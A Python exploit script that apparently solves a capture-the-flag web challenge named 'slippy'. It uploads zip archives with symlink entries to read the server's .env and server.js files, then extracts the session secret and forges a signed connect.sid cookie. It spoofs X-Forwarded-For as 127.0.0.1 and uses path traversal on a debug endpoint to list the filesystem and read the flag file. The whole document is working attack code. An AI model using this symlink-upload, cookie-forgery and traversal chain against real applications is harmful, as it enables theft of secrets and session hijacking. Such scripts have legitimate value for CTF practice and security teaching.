import io
import zipfile
import stat
import requests
import hmac
import hashlib
import base64
import re
from urllib.parse import quote, unquote

url = "https://web-slippy-e2e95aca856a4b46.challs.tfcctf.com"
s = requests.Session()

zip_buffer = io.BytesIO()
with zipfile.ZipFile(zip_buffer, "w") as zf:
    zi = zipfile.ZipInfo("env")
    zi.create_system = 3
    zi.external_attr = (stat.S_IFLNK | 0o777) << 16
    zf.writestr(zi, "../../.env")

    zi = zipfile.ZipInfo("server")
    zi.create_system = 3
    zi.external_attr = (stat.S_IFLNK | 0o777) << 16
    zf.writestr(zi, "../../server.js")

zip_data = zip_buffer.getvalue()
files = {"zipfile": ("exploit.zip", zip_data, "application/zip")}
s.post(url + "/upload", files=files)

r = s.get(url + "/files/env")
session_secret = r.text.split('=')[1].strip()

r = s.get(url + "/files/server")
session_id = re.search(r"store\.set\('(.+)'", r.text).group(1).strip()

print(f"SESSION_SECRET: {session_secret}")
print(f"SESSION_ID: {session_id}")

sig_bytes = hmac.new(session_secret.encode(), session_id.encode(), hashlib.sha256).digest()
sig = base64.b64encode(sig_bytes).decode().rstrip('=')
forged_cookie = quote(f"s:{session_id}.{sig}")
print(f"Forged cookie: {forged_cookie}")

r = requests.get(url + "/debug/files", params={'session_id': '../../../../../../../'}, cookies={'connect.sid': forged_cookie}, headers={'X-Forwarded-For': '127.0.0.1'})

default_folders = ['app', 'bin', 'boot', 'dev', 'etc', 'home', 'lib', 'lib64', 'media', 'mnt', 'opt', 'proc', 'root', 'run', 'sbin', 'srv', 'sys', 'tmp', 'usr', 'var']
folders = re.findall(r'"/files/(\w+)"', r.text)
flag_folder = next(f for f in folders if f not in default_folders)
print("Flag folder: ", flag_folder)

zip_buffer = io.BytesIO()
with zipfile.ZipFile(zip_buffer, "w") as zf:
    zi = zipfile.ZipInfo("flag")
    zi.create_system = 3
    zi.external_attr = (stat.S_IFLNK | 0o777) << 16
    zf.writestr(zi, f"/{flag_folder}/flag.txt")

zip_data = zip_buffer.getvalue()
files = {"zipfile": ("exploit.zip", zip_data, "application/zip")}
s.post(url + "/upload", files=files)

r = s.get(url + "/files/flag")
print(r.text)